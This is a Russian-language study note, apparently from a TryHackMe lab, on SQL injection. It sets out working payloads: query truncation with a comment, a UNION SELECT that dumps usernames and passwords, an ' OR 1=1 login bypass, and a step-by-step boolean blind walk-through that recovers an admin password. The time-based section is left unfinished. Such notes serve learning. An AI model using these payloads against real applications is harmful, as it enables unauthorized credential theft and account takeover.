---
title: "SQL инъекция"
id: note-30
created: "09.01.2026 20:38"
category: "05_Веб-уязвимости"
tags:
  - иб/веб
  - web
---

> [!info] Навигация
> [[🏠 Главная — База знаний ИБ|🏠 Главная]] · Категория: `05_Веб-уязвимости` · Дата: `09.01.2026 20:38`

# SQL инъекция

Пример:

https://website.thm/blog?id=2;--
сгенерирует SQL-запрос:
SELECT * from blog where id=2;-- and private=0 LIMIT 1;

Точка с запятой в URL-адресе обозначает конец SQL- запроса, а два дефиса обрабатывают всё, что следует после неё, как комментарий 

Пример sql атаки которая крадет пароль из базы данных 
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
метод group_concat, чтобы объединить все строки в одну, что облегчает чтение. Также добавили  двоеточие (:),  чтобы разделить имя пользователя и пароль. Вместо запятой мы использовали HTML-  тег <br>  , который размещает каждый результат на отдельной строке для удобства чтения. 

Слепая SQL инъекция 
Обход аутентификации
' OR 1=1;--


 на основе булевых значений 
Определение количества столбцов:
admin123' UNION SELECT 1;-- 
admin123' UNION SELECT 1,2;-- 
admin123' UNION SELECT 1,2,3;--   ← True (3 столбца)

2. Определение имени БД (подбор посимвольно):
admin123' UNION SELECT 1,2,3 where database() like '%';--   ← True
admin123' UNION SELECT 1,2,3 where database() like 's%';--  ← True
admin123' UNION SELECT 1,2,3 where database() like 'sq%';-- ← True
повторять, пока не получим: 'sqli_three'

3. Поиск таблиц в БД sqli_three:
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema='sqli_three' and table_name like 'a%';-- 
перебираем символы, пока не найдём:
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema='sqli_three' and table_name='users';-- ← True

4. Поиск столбцов в таблице users:
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';-- 
находим столбец 'id', затем добавляем исключение:
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';-- 
 повторять, пока не найдём все столбцы: id, username, password

5. Поиск существующего username:
admin123' UNION SELECT 1,2,3 from users where username like 'a%';-- 
перебираем символы, пока не найдём:
admin123' UNION SELECT 1,2,3 from users where username='admin';-- ← True

6. Подбор пароля для пользователя admin:
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%';-- 
перебираем символы, пока не найдём пароль: 3845

7. Использование найденных учётных данных:
Логин: admin
Пароль: 3845

Это все в  https://website.thm/checkuser?username=admin123

На основе времени 

'sqli_four
ana
